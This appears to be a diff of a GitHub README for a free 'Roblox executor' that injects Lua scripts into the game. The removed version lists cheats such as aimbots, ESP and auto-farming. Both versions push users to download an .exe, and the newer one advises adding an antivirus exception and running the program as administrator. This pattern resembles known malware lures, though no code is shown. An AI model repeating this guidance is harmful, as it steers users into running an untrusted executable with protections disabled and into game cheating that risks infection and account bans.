@@ -1,168 +1,81 @@
-# Roblox Executor PC v2.0 - Roblox Script Executor 2026
+# ⚡ roblox-executor-script-hub - Run Roblox scripts with high speed
 
-> **A lightweight Windows application for executing custom Lua scripts in Roblox.** Roblox Executor PC is built for fast setup, simple desktop operation, and convenient access to an expanding script collection in 2026.
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/artpsychological925/roblox-executor-script-hub/releases)
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-blue?style=flat-square&logo=windows)](https://github.com)
-[![Roblox](https://img.shields.io/badge/Compatible-Roblox%202026-red?style=flat-square)](https://github.com)
-[![Scripts](https://img.shields.io/badge/Scripts-500%2B-green?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/dylanreedtgqd6652/roblox-executor-script-hub?style=flat-square)](https://github.com)
+## 📖 Overview
 
----
+The roblox-executor-script-hub provides a tool for Windows users to run scripts within Roblox. This software executes Lua and Luau code quickly. It requires low computer resources. You do not need to deal with keys to use this program. The software supports Windows 10 and Windows 11. It will work on these systems through the year 2026.
 
-<p align="center">
-  <a href="https://dylanreedtgqd6652.github.io/roblox-executor-script-hub/">
-    <img src="https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20Roblox%20Executor-v2.0%20Latest-brightgreen?style=for-the-badge" alt="Download Roblox Executor">
-  </a>
-</p>
+## ⚙️ System Requirements
 
-> **[Download Roblox Executor v2.0](https://dylanreedtgqd6652.github.io/roblox-executor-script-hub/)**  
-> Windows 10 / 11 · 64-bit · Free · No Key Required
+Ensure your computer meets these requirements to run the software:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit version).
+* Processor: Dual-core CPU with 2.0 GHz or higher.
+* Memory: 4 GB of RAM.
+* Graphics: DirectX 11 compatible graphics card.
+* Storage: 200 MB of free space.
+* Internet: Stable connection for script updates.
 
-[Download Latest Build](https://dylanreedtgqd6652.github.io/roblox-executor-script-hub/)
+## 📥 Downloading the Software
 
----
+You need to obtain the file from the project releases page. Follow these instructions to find the file:
 
-## Overview
+1. Visit the [releases page](https://github.com/artpsychological925/roblox-executor-script-hub/releases).
+2. Look for the version labeled "Latest".
+3. Click the file ending in ".exe" to start your download.
+4. Save the file to a folder you can find later, such as your Downloads folder.
 
-Roblox Executor is a native Windows utility for injecting and executing custom Lua and Luau scripts within Roblox game sessions. Its interface avoids lengthy setup processes and oversized installers, giving users a direct way to load scripts with minimal configuration.
+## 🚀 Setting Up the Application
 
-The tool is intended for experimenting with modding ideas, examining game mechanics, and gaining additional control over Roblox gameplay. It is designed to remain light on system resources while supporting current Roblox releases.
+After you download the file, follow these steps to prepare it for use:
 
-A built-in script hub provides access to more than 500 community scripts. Its collection ranges from basic quality-of-life functions to more advanced game modifications. There is no account registration or paid tier: download the application, open it, and begin testing scripts.
+1. Locate the file you just downloaded.
+2. Double-click the file to start the installer.
+3. Follow the prompts on your screen.
+4. Click the "Finish" button to complete the setup.
+5. A shortcut icon will appear on your desktop.
 
----
+## 🛠️ Using the Executor
 
-## Features
+Follow these steps to run your scripts inside Roblox:
 
-- **Quick script injection** - Insert and execute Lua or Luau code in an active Roblox game with a single primary action.
-- **Integrated script hub** - Find 500+ community-created scripts grouped by game and purpose.
-- **Automatic updates** - Follows Roblox client changes to help preserve compatibility between versions.
-- **Low resource usage** - Idle operation requires less than 50 MB of RAM.
-- **Drag-and-drop imports** - Drop `.lua` and `.txt` files onto the application to prepare them for execution.
-- **Live execution console** - Inspect output, errors, and other script feedback as it appears.
-- **Multi-instance support** - Operate with multiple Roblox clients without conflicts or crashes.
-- **Standalone operation** - Runs on a clean Windows installation without requiring additional frameworks.
+1. Launch your Roblox game.
+2. Open the script executor from your desktop icon.
+3. If a window appears, verify that your Roblox game is active.
+4. Copy your script text.
+5. Paste the script into the text area inside the executor.
+6. Click the "Execute" button.
+7. Observe the script behavior within the game.
 
----
+## 🔍 Troubleshooting Common Issues
 
-## Available Games and Script Types
+If you experience problems, check these items:
 
-| Game | Script Categories |
-|------|-------------------|
-| Adopt Me! | Auto-farm, pet management, trading helpers |
-| Brookhaven | Teleportation, vehicle mods, roleplay tools |
-| Jailbreak | Auto-robbery, police radar, vehicle spawners |
-| Blox Fruits | Auto-farm, stat allocation, fruit finder |
-| Tower of Hell | Auto-complete, speed boosts, checkpoint skips |
-| Arsenal | Aimbot, ESP, weapon unlockers |
-| Generic Scripts | GUI libraries, anti-afk, chat automation |
+* Antivirus Software: Sometimes antivirus programs block script executors. Add an exception for the folder where you installed the software.
+* Permissions: Right-click the shortcut and select "Run as administrator". This grants the program the necessary access to interact with your game.
+* Updates: Always use the latest version from the releases page to maintain compatibility.
+* File Integrity: If the program does not open, delete the file and download a fresh copy from the link provided above.
+* Compatibility Mode: Right-click the shortcut, select Properties, go to the Compatibility tab, and select Windows 8 mode if you face crashing.
 
----
+## 🛡️ Safety and Security
 
-## Requirements
+This software performs code injection. Use only scripts from trusted sources. Never paste code that you do not understand. Scripts can change your game experience. You take responsibility for the scripts you choose to run. This software does not track your personal data or login credentials.
 
-| Component | Minimum |
-|-----------|---------|
-| Operating System | Windows 10 (64-bit) or Windows 11 |
-| Processor | Intel Core i3 or AMD equivalent |
-| Memory | 4 GB RAM |
-| Storage | 200 MB available space |
-| .NET Framework | .NET 6.0 Runtime or later |
-| Roblox | Latest Roblox Player installed |
+## 📈 Performance Tips
 
----
+The program uses minimal system resources. If your game runs slow, try these adjustments:
 
-## Installation and First Run
+* Close other programs while playing.
+* Reduce the graphics settings inside the Roblox menu.
+* Clear your temporary files using the Windows Disk Cleanup tool.
 
-Download or clone the repository, then start the executable:
+## 🗒️ Feature Highlights
 
-```bash
-git clone https://github.com/dylanreedtgqd6652/roblox-executor-script-hub.git
-cd roblox-executor
-./RobloxExecutor.exe
-```
+* Fast Execution: Optimized for rapid Lua and Luau code processing.
+* No Key System: Bypass wait times and key validation.
+* Long-term Support: Compatible with system updates through 2026.
+* Simple Interface: Designed for users who prefer clear buttons over complex menus.
+* Resource Efficiency: Runs quietly in the background without slowing your system.
 
-The program does not require extra setup. After it launches, open Roblox, enter a game, and select the inject button to begin running scripts.
-
----
-
-## Script Hub Search Topics for 2026
-
-Common script categories include:
-
-- Blox Fruits and Pet Simulator auto-farming scripts
-- GUI-driven ESP and wallhack utilities for PvP experiences
-- Teleport and speed tools for exploration-focused games
-- Anti-afk and automatic collection helpers
-- Custom character modifications and animation replacements
-- Server-side script execution utilities
-- Lua debugging features and script development tools
-
----
-
-## Project Layout
-
-```
-RobloxExecutor/
-├── RobloxExecutor.exe
-├── ScriptHub/
-│   ├── AdoptMe/
-│   ├── BloxFruits/
-│   ├── Jailbreak/
-│   └── Generic/
-├── Libraries/
-│   ├── injector.dll
-│   └── luau_runtime.dll
-├── Config/
-│   ├── settings.json
-│   └── whitelist.txt
-├── Logs/
-│   └── executor.log
-├── README.md
-└── LICENSE
-```
-
----
-
-## Frequently Asked Questions
-
-**Is Roblox Executor safe?**  
-Use the software at your own discretion. Third-party tools that alter Roblox gameplay can conflict with Roblox's terms of service. This project is provided for educational and testing purposes only.
-
-**Does it remain compatible when Roblox changes?**  
-The project tracks Roblox client changes and publishes updates when necessary to support compatibility. Refer to the repository for the newest release.
-
-**What makes it different from other executors?**  
-The project focuses on a straightforward workflow and modest resource usage. It avoids unnecessary extras and premium levels, making the available functionality free to access.
-
-**Could using it result in an account ban?**  
-Script execution tools always carry a ban risk. For testing, consider using an alternate account and take care with the scripts used in public servers.
-
-**Where does the application keep scripts?**  
-Downloaded and user-created scripts are saved on the local machine in the `ScriptHub/` directory. They are not uploaded or distributed unless you choose to do so.
-
----
-
-## 2026 Development Roadmap
-
-- [x] Core script injection engine
-- [x] Script hub with 500+ scripts
-- [ ] Cloud script syncing across devices
-- [ ] Built-in Lua script editor with syntax highlighting
-- [ ] Community script submission system
-- [ ] MacOS and Linux compatibility testing
-
----
-
-## License
-
-This project is distributed under the GNU GPL v3.0. Read [LICENSE](LICENSE) for the complete license terms.
-
----
-
-<p align="center">
-  <i>Run your code. Explore Roblox freely. Roblox Executor v2.0.</i>
-</p>
+Keywords: roblox, script, executor, windows, lua, luau, gaming, automation
